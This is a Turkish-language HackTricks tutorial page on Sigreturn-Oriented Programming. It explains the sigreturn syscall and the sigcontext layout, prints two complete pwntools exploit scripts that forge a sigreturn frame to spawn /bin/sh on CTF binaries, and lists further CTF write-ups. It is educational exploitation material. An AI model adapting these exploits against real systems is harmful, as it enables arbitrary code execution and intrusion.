# SROP - Sigreturn-Oriented Programming

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Temel Bilgiler

**`Sigreturn`**, bir sinyal işleyicisinin yürütmesini tamamladıktan sonra temizlemek için kullanılan özel bir **syscall**'dır. Sinyaller, bir programın işletim sistemi tarafından gönderilen kesintilerdir ve genellikle olağanüstü bir durumun meydana geldiğini belirtmek için kullanılır. Bir program bir sinyal aldığında, sinyali işlemek için geçici olarak mevcut işini durdurur ve sinyalleri ele almak için tasarlanmış özel bir işlev olan **sinyal işleyici** ile sinyali işler.

Sinyal işleyici tamamlandıktan sonra, programın **önceki durumuna devam etmesi** gerekir, sanki hiçbir şey olmamış gibi. İşte bu noktada **`sigreturn`** devreye girer. Programın **sinyal işleyicisinden dönmesine** yardımcı olur ve sinyal işleyici tarafından kullanılan yığın çerçevesini (işlev çağrılarını ve yerel değişkenleri depolayan bellek bölümü) temizleyerek programın durumunu geri yükler.

İlginç olan, **`sigreturn`**'ın programın durumunu nasıl geri yüklediğidir: bunu **CPU'nun tüm kayıt değerlerini yığında depolayarak** yapar. Sinyal artık engellenmediğinde, **`sigreturn` bu değerleri yığından çıkarır**, böylece CPU'nun kayıtlarını sinyal işlenmeden önceki durumuna sıfırlar. Bu, yığının mevcut üst kısmını gösteren yığın işaretçi kaydı (RSP) dahil olmak üzere tüm kayıtları içerir.

{% hint style="danger" %}
Bir ROP zincirinden **`sigreturn`** syscall'ını çağırarak ve **yüklemek istediğimiz kayıt değerlerini** **yığına** ekleyerek, tüm kayıt değerlerini **kontrol etmek** ve dolayısıyla örneğin `execve` syscall'ını `/bin/sh` ile **çağırmak** mümkündür.
{% endhint %}

Bu durumun, diğer Ret2syscall'ları çağırmak için parametreleri kontrol etmeyi çok daha kolay hale getiren bir **Ret2syscall türü** olduğunu unutmayın:

{% content-ref url="../rop-syscall-execv/" %}
[rop-syscall-execv](../rop-syscall-execv/)
{% endcontent-ref %}

Eğer merak ediyorsanız, bu daha sonra değerleri geri almak için yığında depolanan **sigcontext yapısıdır** (şeması [**buradan**](https://guyinatuxedo.github.io/16-srop/backdoor_funsignals/index.html)):
```
+--------------------+--------------------+
| rt_sigeturn()      | uc_flags           |
+--------------------+--------------------+
| &uc                | uc_stack.ss_sp     |
+--------------------+--------------------+
| uc_stack.ss_flags  | uc.stack.ss_size   |
+--------------------+--------------------+
| r8                 | r9                 |
+--------------------+--------------------+
| r10                | r11                |
+--------------------+--------------------+
| r12                | r13                |
+--------------------+--------------------+
| r14                | r15                |
+--------------------+--------------------+
| rdi                | rsi                |
+--------------------+--------------------+
| rbp                | rbx                |
+--------------------+--------------------+
| rdx                | rax                |
+--------------------+--------------------+
| rcx                | rsp                |
+--------------------+--------------------+
| rip                | eflags             |
+--------------------+--------------------+
| cs / gs / fs       | err                |
+--------------------+--------------------+
| trapno             | oldmask (unused)   |
+--------------------+--------------------+
| cr2 (segfault addr)| &fpstate           |
+--------------------+--------------------+
| __reserved         | sigmask            |
+--------------------+--------------------+
```
Daha iyi bir açıklama için ayrıca kontrol edin:

{% embed url="https://youtu.be/ADULSwnQs-s?feature=shared" %}

## Örnek

[**Burada bir örnek bulabilirsiniz**](https://ir0nstone.gitbook.io/notes/types/stack/syscalls/sigreturn-oriented-programming-srop/using-srop) burada signeturn çağrısı ROP aracılığıyla oluşturulmuştur (rxa'ya `0xf` değeri konulmuştur), ancak buradan itibaren bu son istismar:
```python
from pwn import *

elf = context.binary = ELF('./vuln', checksec=False)
p = process()

BINSH = elf.address + 0x1250
POP_RAX = 0x41018
SYSCALL_RET = 0x41015

frame = SigreturnFrame()
frame.rax = 0x3b            # syscall number for execve
frame.rdi = BINSH           # pointer to /bin/sh
frame.rsi = 0x0             # NULL
frame.rdx = 0x0             # NULL
frame.rip = SYSCALL_RET

payload = b'A' * 8
payload += p64(POP_RAX)
payload += p64(0xf)         # 0xf is the number of the syscall sigreturn
payload += p64(SYSCALL_RET)
payload += bytes(frame)

p.sendline(payload)
p.interactive()
```
Ayrıca [**buradan istismarı kontrol edin**](https://guyinatuxedo.github.io/16-srop/csaw19\_smallboi/index.html) burada ikili dosya zaten `sigreturn` çağrıyordu ve bu nedenle bununla bir **ROP** inşa etmek gerekmez:
```python
from pwn import *

# Establish the target
target = process("./small_boi")
#gdb.attach(target, gdbscript = 'b *0x40017c')
#target = remote("pwn.chal.csaw.io", 1002)

# Establish the target architecture
context.arch = "amd64"

# Establish the address of the sigreturn function
sigreturn = p64(0x40017c)

# Start making our sigreturn frame
frame = SigreturnFrame()

frame.rip = 0x400185 # Syscall instruction
frame.rax = 59       # execve syscall
frame.rdi = 0x4001ca # Address of "/bin/sh"
frame.rsi = 0x0      # NULL
frame.rdx = 0x0      # NULL

payload = "0"*0x28 # Offset to return address
payload += sigreturn # Function with sigreturn
payload += str(frame)[8:] # Our sigreturn frame, adjusted for the 8 byte return shift of the stack

target.sendline(payload) # Send the target payload

# Drop to an interactive shell
target.interactive()
```
## Diğer Örnekler ve Referanslar

* [https://youtu.be/ADULSwnQs-s?feature=shared](https://youtu.be/ADULSwnQs-s?feature=shared)
* [https://ir0nstone.gitbook.io/notes/types/stack/syscalls/sigreturn-oriented-programming-srop](https://ir0nstone.gitbook.io/notes/types/stack/syscalls/sigreturn-oriented-programming-srop)
* [https://guyinatuxedo.github.io/16-srop/backdoor\_funsignals/index.html](https://guyinatuxedo.github.io/16-srop/backdoor\_funsignals/index.html)
* **Yığıta yazma** ve ardından **`sigreturn`** syscall'ini çağıran bir assembly ikili dosyası. Yığıta bir [**ret2syscall**](../rop-syscall-execv/) yazmak ve ikilinin belleğindeki bayrağı okumak mümkündür.
* [https://guyinatuxedo.github.io/16-srop/csaw19\_smallboi/index.html](https://guyinatuxedo.github.io/16-srop/csaw19\_smallboi/index.html)
* **Yığıta yazma** ve ardından **`sigreturn`** syscall'ini çağıran bir assembly ikili dosyası. Yığıta bir [**ret2syscall**](../rop-syscall-execv/) yazmak mümkündür (ikili dosya `/bin/sh` dizesine sahiptir).
* [https://guyinatuxedo.github.io/16-srop/inctf17\_stupidrop/index.html](https://guyinatuxedo.github.io/16-srop/inctf17\_stupidrop/index.html)
* 64 bit, relro yok, canary yok, nx, pie yok. `gets` fonksiyonunu kötüye kullanarak basit bir buffer overflow. [**ret2syscall**](../rop-syscall-execv/) gerçekleştiren gadget eksikliği. ROP zinciri, tekrar `gets` çağrısı yaparak `/bin/sh`'yi `.bss`'ye yazar, `eax`'ı `0xf` olarak ayarlamak için **`alarm`** fonksiyonunu kötüye kullanır ve bir **SROP** çağırarak bir shell çalıştırır.
* [https://guyinatuxedo.github.io/16-srop/swamp19\_syscaller/index.html](https://guyinatuxedo.github.io/16-srop/swamp19\_syscaller/index.html)
* 64 bit assembly programı, relro yok, canary yok, nx, pie yok. Akış, yığıta yazma, birkaç kaydı kontrol etme ve bir syscall çağırma imkanı sağlar ve ardından `exit` çağrılır. Seçilen syscall, kayıtları ayarlayacak ve `eip`'yi önceki syscall talimatını çağırmak için hareket ettirecek bir `sigreturn`'dır ve ikili alanı `rwx` olarak ayarlamak için `memprotect` çağrısı yapar ve ESP'yi ikili alanda ayarlar. Akışı takip ederek, program tekrar ESP'ye okuma yapacak, ancak bu durumda ESP bir sonraki talimata işaret edecektir, böylece bir shellcode geçerek onu bir sonraki talimat olarak yazacak ve çalıştıracaktır.
* [https://www.ctfrecipes.com/pwn/stack-exploitation/arbitrary-code-execution/code-reuse-attack/sigreturn-oriented-programming-srop#disable-stack-protection](https://www.ctfrecipes.com/pwn/stack-exploitation/arbitrary-code-execution/code-reuse-attack/sigreturn-oriented-programming-srop#disable-stack-protection)
* SROP, bir shellcode'un yerleştirildiği yere yürütme ayrıcalıkları (memprotect) vermek için kullanılır.

{% hint style="success" %}
AWS Hacking'i öğrenin ve pratik yapın:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i öğrenin ve pratik yapın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter**'da **bizi takip edin** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Hacking ipuçlarını paylaşmak için** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.

</details>
{% endhint %}
